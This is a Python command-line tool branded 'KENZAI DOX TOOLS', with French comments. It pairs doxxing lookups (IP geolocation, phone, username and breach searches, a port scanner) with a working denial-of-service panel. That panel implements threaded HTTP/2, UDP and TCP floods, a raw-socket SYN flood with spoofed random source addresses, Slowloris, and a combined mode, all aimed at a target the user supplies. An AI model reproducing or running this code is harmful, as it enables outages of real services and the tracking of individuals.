#!/usr/bin/env python3
# KENZAI DOX TOOLS v3.0 - DDoS ULTIME CORRIGÉ
# HTTP/2 réel, multi-threading parallèle, amplification fonctionnelle

import os
import sys
import time
import json
import random
import socket
import struct
import threading
import requests
import ssl
import http.client
import h2.connection
import h2.config
import dns.resolver
import phonenumbers
from colorama import Fore, Style, init
from urllib.parse import urlparse

init(autoreset=True)

os.system('title KENZAI - DOX TOOLS v3.0 - DDoS ULTIME')
os.system('mode con: cols=110 lines=45')

stop_attack = False
active_sockets = []

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{Fore.RED}   ██╗  ██╗███████╗███╗   ██╗███████╗ █████╗ ██╗
{Fore.RED}   ██║ ██╔╝██╔════╝████╗  ██║╚══███╔╝██╔══██╗██║
{Fore.RED}   █████╔╝ █████╗  ██╔██╗ ██║  ███╔╝ ███████║██║
{Fore.RED}   ██╔═██╗ ██╔══╝  ██║╚██╗██║ ███╔╝  ██╔══██║██║
{Fore.RED}   ██║  ██╗███████╗██║ ╚████║███████╗██║  ██║██║
{Fore.RED}   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝{Style.RESET_ALL}
{Fore.CYAN}   - KENZAI DOX TOOLS v3.0 - DDoS ULTIME CORRIGÉ -
{Fore.YELLOW}   - DOX - OSINT - ULTIME DDOS 2026 -{Style.RESET_ALL}
{Fore.WHITE}
{Fore.GREEN}┌{'-'*70}┐{Style.RESET_ALL}
{Fore.GREEN}│{Fore.CYAN} ULTIME DDOS - VRAI HTTP/2, VRAI multi-threading, VRAIE amplification{Fore.GREEN}│{Style.RESET_ALL}
{Fore.GREEN}└{'-'*70}┘{Style.RESET_ALL}
"""
    print(banner)

def menu():
    print(f"""
{Fore.WHITE}[01] IP Locator       [02] Phone Lookup    [03] Email Hunter
[04] Username Search  [05] DNS Lookup      [06] Port Scanner
[07] Whois Lookup     [08] GeoIP           [09] Breach Check
[10] Pastebin Search  [11] Reverse Image   {Fore.RED}[12] DDOS ULTIME{Style.RESET_ALL}
[13] Exit

{Fore.YELLOW}[P/N] Prev/Next Page | [60] Info | [61] Settings | [99] Exit{Style.RESET_ALL}

{Fore.CYAN}v3.0 | mode: ULTIME DDOS 2026{Style.RESET_ALL}
{Fore.RED}kenzai@ultimate:~/{Style.RESET_ALL} """, end="")

# ============ DOX TOOLS ============

def ip_locator():
    clear()
    print(f"\n{Fore.CYAN}[01] IP Locator{Style.RESET_ALL}\n")
    ip = input("IP address: ")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}")
        data = r.json()
        if data['status'] == 'success':
            print(f"\n{Fore.GREEN}IP: {data['query']}")
            print(f"Pays: {data['country']}")
            print(f"Region: {data['regionName']}")
            print(f"Ville: {data['city']}")
            print(f"Lat/Lon: {data['lat']}, {data['lon']}{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}Erreur{Style.RESET_ALL}")
    input()

def phone_lookup():
    clear()
    print(f"\n{Fore.CYAN}[02] Phone Lookup{Style.RESET_ALL}\n")
    phone = input("Numero (+336XXXXXXXX): ")
    try:
        parsed = phonenumbers.parse(phone)
        print(f"\n{Fore.GREEN}Valide: {phonenumbers.is_valid_number(parsed)}")
        print(f"Pays: {phonenumbers.region_code_for_number(parsed)}")
        print(f"International: {phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}Numero invalide{Style.RESET_ALL}")
    input()

def email_hunter():
    clear()
    print(f"\n{Fore.CYAN}[03] Email Hunter{Style.RESET_ALL}\n")
    email = input("Email: ")
    try:
        domain = email.split('@')[1]
        print(f"\n{Fore.GREEN}Email: {email}")
        print(f"Domaine: {domain}{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}Email invalide{Style.RESET_ALL}")
    input()

def username_search():
    clear()
    print(f"\n{Fore.CYAN}[04] Username Search{Style.RESET_ALL}\n")
    username = input("Username: ")
    sites = {
        "Twitter": f"https://twitter.com/{username}",
        "Instagram": f"https://instagram.com/{username}",
        "GitHub": f"https://github.com/{username}"
    }
    for site, url in sites.items():
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                print(f"{Fore.GREEN}[FOUND] {site}: {url}{Style.RESET_ALL}")
        except:
            pass
    input()

def dns_lookup():
    clear()
    print(f"\n{Fore.CYAN}[05] DNS Lookup{Style.RESET_ALL}\n")
    domain = input("Domain: ")
    try:
        ip = socket.gethostbyname(domain)
        print(f"{Fore.GREEN}{domain} -> {ip}{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}Erreur{Style.RESET_ALL}")
    input()

def port_scanner():
    clear()
    print(f"\n{Fore.CYAN}[06] Port Scanner{Style.RESET_ALL}\n")
    target = input("IP: ")
    ports = [80, 443, 22, 21, 25, 53, 3306, 8080, 8443, 25565]
    print(f"\n{Fore.YELLOW}Scan de {target}...{Style.RESET_ALL}\n")
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        if sock.connect_ex((target, port)) == 0:
            print(f"{Fore.GREEN}Port {port}: OPEN{Style.RESET_ALL}")
        sock.close()
    input()

def whois_lookup():
    clear()
    print(f"\n{Fore.CYAN}[07] Whois Lookup{Style.RESET_ALL}\n")
    domain = input("Domain: ")
    print(f"{Fore.GREEN}https://who.is/whois/{domain}{Style.RESET_ALL}")
    input()

def geoip():
    clear()
    print(f"\n{Fore.CYAN}[08] GeoIP{Style.RESET_ALL}\n")
    ip = input("IP: ")
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json")
        data = r.json()
        print(f"\n{Fore.GREEN}IP: {data.get('ip')}")
        print(f"Ville: {data.get('city')}")
        print(f"Pays: {data.get('country')}{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}Erreur{Style.RESET_ALL}")
    input()

def breach_check():
    clear()
    print(f"\n{Fore.CYAN}[09] Breach Check{Style.RESET_ALL}\n")
    email = input("Email: ")
    try:
        r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}")
        if r.status_code == 200:
            print(f"{Fore.RED}Email compromis !{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}Aucune fuite{Style.RESET_ALL}")
    except:
        print(f"{Fore.GREEN}Erreur{Style.RESET_ALL}")
    input()

def pastebin_search():
    clear()
    print(f"\n{Fore.CYAN}[10] Pastebin Search{Style.RESET_ALL}\n")
    query = input("Recherche: ")
    print(f"{Fore.GREEN}https://pastebin.com/search?q={query}{Style.RESET_ALL}")
    input()

def reverse_image():
    clear()
    print(f"\n{Fore.CYAN}[11] Reverse Image{Style.RESET_ALL}\n")
    url = input("Image URL: ")
    print(f"{Fore.GREEN}Google: https://www.google.com/searchbyimage?image_url={url}{Style.RESET_ALL}")
    input()

# ============ ULTIME DDOS CORRIGÉ ============

def close_all_sockets():
    """Ferme toutes les sockets actives"""
    global active_sockets
    for sock in active_sockets:
        try:
            sock.close()
        except:
            pass
    active_sockets.clear()

def ddos_ultimate():
    global stop_attack
    clear()
    print(f"{Fore.RED}")
    print("╔════════════════════════════════════════════════════════════════════════════╗")
    print("║                    KENZAI - ULTIME DDOS PANEL 2026                         ║")
    print("║              Version CORRIGÉE - VRAI HTTP/2 - VRAI multi-threading         ║")
    print("╚════════════════════════════════════════════════════════════════════════════╝")
    print(f"{Style.RESET_ALL}")
    
    print(f"""
{Fore.CYAN}┌─────────────────────────────────────────────────────────────────────────────┐
{Fore.CYAN}│                         METHODES D'ATTAQUE                                   │
{Fore.CYAN}├─────────────────────────────────────────────────────────────────────────────┤
{Fore.WHITE}│  {Fore.GREEN}[1] {Fore.WHITE}HTTP/2 FLOOD         {Fore.CYAN}│ VRAI HTTP/2 avec h2 library - Multi-plexing{Fore.CYAN}          │
{Fore.WHITE}│  {Fore.GREEN}[2] {Fore.WHITE}UDP FLOOD            {Fore.CYAN}│ Multi-threading parallèle - Saturation bande passante{Fore.CYAN}│
{Fore.WHITE}│  {Fore.GREEN}[3] {Fore.WHITE}TCP FLOOD            {Fore.CYAN}│ Connexions TCP parallèles - Épuise les sockets{Fore.CYAN}      │
{Fore.WHITE}│  {Fore.GREEN}[4] {Fore.WHITE}SYN FLOOD            {Fore.CYAN}│ RAW sockets (admin requis) - Demi-connexions{Fore.CYAN}        │
{Fore.WHITE}│  {Fore.GREEN}[5] {Fore.WHITE}SLOWLORIS           {Fore.CYAN}│ Connexions lentes avec timeout étendu{Fore.CYAN}               │
{Fore.WHITE}│  {Fore.GREEN}[6] {Fore.WHITE}ALL IN ONE          {Fore.CYAN}│ Toutes méthodes en parallèle (PUISSANCE MAX){Fore.CYAN}        │
{Fore.CYAN}└─────────────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}
    """)
    
    target = input(f"{Fore.YELLOW}[?] IP cible ou domaine: {Style.RESET_ALL}")
    port = int(input(f"{Fore.YELLOW}[?] Port (80/443): {Style.RESET_ALL}") or "80")
    threads = int(input(f"{Fore.YELLOW}[?] Threads par méthode (100-5000): {Style.RESET_ALL}"))
    duration = int(input(f"{Fore.YELLOW}[?] Durée en secondes: {Style.RESET_ALL}"))
    method = input(f"{Fore.YELLOW}[?] Méthode (1-6): {Style.RESET_ALL}")
    
    # Résolution du domaine
    try:
        target_ip = socket.gethostbyname(target)
        print(f"{Fore.GREEN}[+] Résolu: {target} -> {target_ip}{Style.RESET_ALL}")
    except:
        target_ip = target
    
    print(f"\n{Fore.RED}[KENZAI] LANCEMENT DE L'ATTAQUE ULTIME{Style.RESET_ALL}")
    print(f"{Fore.RED}[KENZAI] Cible: {target_ip}:{port}")
    print(f"[KENZAI] Threads par méthode: {threads}")
    print(f"[KENZAI] Durée: {duration}s{Style.RESET_ALL}\n")
    
    stop_attack = False
    close_all_sockets()
    
    # ============================================================
    # 1. VRAI HTTP/2 FLOOD - Utilise la bibliothèque h2
    #    Multi-plexing: plusieurs requêtes sur une seule connexion
    # ============================================================
    def http2_flood():
        config = h2.config.H2Configuration(client_side=True)
        while not stop_attack:
            try:
                conn = h2.connection.H2Connection(config=config)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                if port == 443:
                    context = ssl.create_default_context()
                    sock = context.wrap_socket(sock, server_hostname=target)
                sock.connect((target_ip, port))
                active_sockets.append(sock)
                conn.initiate_connection()
                sock.send(conn.data_to_send())
                
                # Envoi de 1000 requêtes sur une seule connexion (multi-plexing)
                for _ in range(1000):
                    if stop_attack:
                        break
                    stream_id = conn.get_next_available_stream_id()
                    conn.send_headers(stream_id, [
                        (':method', 'GET'),
                        (':path', '/' + '?' + 'x' * random.randint(100, 10000)),
                        (':scheme', 'https' if port == 443 else 'http'),
                        (':authority', target),
                        ('user-agent', random.choice(['Mozilla/5.0', 'Chrome/120', 'Firefox/121']))
                    ], end_headers=True)
                    sock.send(conn.data_to_send())
                    time.sleep(0.001)
            except:
                pass
    
    # ============================================================
    # 2. UDP FLOOD - Multi-threading parallèle
    #    Chaque thread envoie en continu sans pause
    # ============================================================
    def udp_flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        active_sockets.append(sock)
        packet = random._urandom(1400)
        while not stop_attack:
            try:
                sock.sendto(packet, (target_ip, port))
            except:
                pass
    
    # ============================================================
    # 3. TCP FLOOD - Connexions TCP parallèles
    #    Ouvre et ferme rapidement des connexions
    # ============================================================
    def tcp_flood():
        while not stop_attack:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, port))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
                active_sockets.append(sock)
                time.sleep(0.001)
            except:
                pass
    
    # ============================================================
    # 4. SYN FLOOD - RAW sockets (nécessite admin)
    # ============================================================
    def syn_flood():
        try:
            # Création du socket RAW
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            active_sockets.append(sock)
            
            while not stop_attack:
                # Construction du paquet IP + TCP SYN
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                # IP Header
                ip_ihl = 5
                ip_ver = 4
                ip_tos = 0
                ip_tot_len = 40
                ip_id = random.randint(1, 65535)
                ip_frag_off = 0
                ip_ttl = 255
                ip_proto = socket.IPPROTO_TCP
                ip_check = 0
                ip_saddr = socket.inet_aton(src_ip)
                ip_daddr = socket.inet_aton(target_ip)
                
                ip_header = struct.pack('!BBHHHBBH4s4s',
                    (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
                    ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
                    ip_saddr, ip_daddr)
                
                # TCP Header
                tcp_source = random.randint(1024, 65535)
                tcp_seq = random.randint(0, 4294967295)
                tcp_ack_seq = 0
                tcp_doff = 5
                tcp_flags = 0x02  # SYN flag
                tcp_window = socket.htons(5840)
                tcp_check = 0
                tcp_urg_ptr = 0
                
                tcp_offset_res = (tcp_doff << 4) + 0
                tcp_header = struct.pack('!HHLLBBHHH',
                    tcp_source, port, tcp_seq, tcp_ack_seq,
                    tcp_offset_res, tcp_flags, tcp_window,
                    tcp_check, tcp_urg_ptr)
                
                packet = ip_header + tcp_header
                sock.sendto(packet, (target_ip, 0))
        except:
            pass
    
    # ============================================================
    # 5. SLOWLORIS - Connexions lentes avec timeout étendu
    #    Envoie des headers très lentement
    # ============================================================
    def slowloris():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((target_ip, port))
            active_sockets.append(sock)
            
            # Envoi du premier header
            sock.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
            
            while not stop_attack:
                # Envoi d'un header toutes les 5-15 secondes
                sock.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                time.sleep(random.uniform(5, 15))
        except:
            pass
    
    # Lancement selon méthode
    if method == "1":  # HTTP/2 Flood
        for _ in range(threads):
            threading.Thread(target=http2_flood, daemon=True).start()
    elif method == "2":  # UDP Flood
        for _ in range(threads):
            threading.Thread(target=udp_flood, daemon=True).start()
    elif method == "3":  # TCP Flood
        for _ in range(threads):
            threading.Thread(target=tcp_flood, daemon=True).start()
    elif method == "4":  # SYN Flood (admin requis)
        if os.name == 'nt':
            print(f"{Fore.YELLOW}[!] SYN Flood nécessite admin sur Windows{Style.RESET_ALL}")
        for _ in range(threads):
            threading.Thread(target=syn_flood, daemon=True).start()
    elif method == "5":  # Slowloris
        for _ in range(threads):
            threading.Thread(target=slowloris, daemon=True).start()
    elif method == "6":  # ALL IN ONE
        t = threads // 5
        for _ in range(t):
            threading.Thread(target=http2_flood, daemon=True).start()
            threading.Thread(target=udp_flood, daemon=True).start()
            threading.Thread(target=tcp_flood, daemon=True).start()
            threading.Thread(target=slowloris, daemon=True).start()
        if os.name == 'nt' or True:
            for _ in range(t):
                threading.Thread(target=syn_flood, daemon=True).start()
    
    # Compte à rebours
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            active = threading.active_count() - 1
            sys.stdout.write(f"\r{Fore.YELLOW}[⏱] Temps: {elapsed}/{duration}s | Threads actifs: {active}{Style.RESET_ALL}")
            sys.stdout.flush()
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    
    stop_attack = True
    close_all_sockets()
    
    print(f"\n\n{Fore.GREEN}[KENZAI] Attaque ultime terminée.{Style.RESET_ALL}")
    input()

# ============ MAIN ============

def main():
    while True:
        clear()
        print_banner()
        menu()
        choice = input()
        
        if choice in ["01", "1"]:
            ip_locator()
        elif choice in ["02", "2"]:
            phone_lookup()
        elif choice in ["03", "3"]:
            email_hunter()
        elif choice in ["04", "4"]:
            username_search()
        elif choice in ["05", "5"]:
            dns_lookup()
        elif choice in ["06", "6"]:
            port_scanner()
        elif choice in ["07", "7"]:
            whois_lookup()
        elif choice in ["08", "8"]:
            geoip()
        elif choice in ["09", "9"]:
            breach_check()
        elif choice == "10":
            pastebin_search()
        elif choice == "11":
            reverse_image()
        elif choice == "12":
            ddos_ultimate()
        elif choice in ["13", "99"]:
            print(f"{Fore.RED}[KENZAI] Au revoir{Style.RESET_ALL}")
            sys.exit()
        elif choice == "60":
            print(f"\n{Fore.CYAN}[INFO] KENZAI DOX TOOLS v3.0")
            print("DDoS ULTIME corrigé - VRAI HTTP/2, multi-threading, sockets propres")
            input()
        else:
            print(f"{Fore.RED}Option invalide{Style.RESET_ALL}")
            time.sleep(1)

if __name__ == "__main__":
    main()